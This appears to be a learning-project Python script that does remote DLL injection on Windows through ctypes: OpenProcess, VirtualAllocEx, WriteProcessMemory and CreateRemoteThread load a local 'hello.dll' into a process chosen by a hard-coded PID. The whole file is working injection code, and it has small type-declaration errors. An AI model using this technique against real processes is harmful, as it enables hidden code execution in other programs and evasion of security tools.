#this is a project to solid my understanding of the windows API 
'''
first we need to allocate the memory in a remote process
second , then writing a dll location in that memory
lastly, we need the external process load the dll 
'''

from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCSTR   = c_char_p
SIZE_T     = c_size_t

# utilizing the openprocess API function
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

# VirtualAllocEx is used to allocate memory in another processes
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD,  wintypes.DWORD)
VirtualAllocEx.restype= wintypes.LPVOID


#The WriteProcessMemory function is used to write data to the memory of a specified process
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL


#The GetModuleHandle function is used to retrieve a handle to a loaded module (such as a DLL or EXE) in the memory of the calling process.
GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = [LPCSTR]
GetModuleHandle.restype = wintypes.HANDLE


#GetProcAddress is used for retriving the address of an exported function(procedure)
GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCSTR)
GetModuleHandle.restype=wintypes.LPVOID

#defining the seurity attribute o utilize the pointer for the remotethread
class _SECURITY_ATTRIBUTES_(Structure):
	_fields_=[("nLength",wintypes.DWORD),
			  ("lpsecurityDescriptor", wintypes.LPVOID),
			  ("nInheritHandle", wintypes.BOOL)]
SECURITY_ATTRIBUTES	= _SECURITY_ATTRIBUTES_
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES_)	  
LPTHREAD_START_ROUTINE= wintypes.LPVOID

#CreateRemoteThread is used for creating the thread which runs in the virtual addr of the another process
CreateRemoteThread= kernel32.CreateRemoteThread
CreateRemoteThread.argtypes= (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPWORD )
CreateRemoteThread.restype= wintypes.HANDLE

#defining some constants for the mmory
MEM_COMMIT     = 0x00001000  # this allocates a memory for virtual space
MEM_RESERVE	   = 0x00002000  # this is reserving the memory for virtual space without actually allocating
PAGE_READWRITE = 0x04	     # access for reading and writing in the allocated virtual spce		
EXECUTE_IMMEDIATELY = 0x00
PROCESS_ALL_ACCESS = 0x001F0FFF  #to give all access to the process

# location of the compiled dll
dll = b"I:\\projects-Cyber\\Cyber-Practice-Projects\\remote-dll-injection\\hello.dll"
pid  =15976 #pid of a parent process

# getting the handle for the parent process
handle = OpenProcess(PROCESS_ALL_ACCESS, False,pid )

if not handle:
	raise WinError()

print("Handle obtained => {0:X}".format(handle))	

# allocating a remote memory for our dll
remote_memory = VirtualAllocEx(handle, False, len(dll)+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

if not remote_memory:
	raise WinError()

print("Remote Memory => ", hex(remote_memory))	

#writimg our dll location into the remote memory
write = WriteProcessMemory(handle, remote_memory, dll, len(dll)+1, None)

if not write:
	raise WinError()

print("Bytes Written => {}".format(dll))	

#loading the dll in the load library memory
load_library = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
if not load_library:
    raise WinError()

print("LoadLibrary address => ", hex(load_library))	

#creating the remote thread to execute the dll
r_thread = CreateRemoteThread(handle, None, 0, load_library, remote_memory, 0, None)
if not r_thread:
    raise WinError()

print("Remote thread created => ", hex(r_thread))


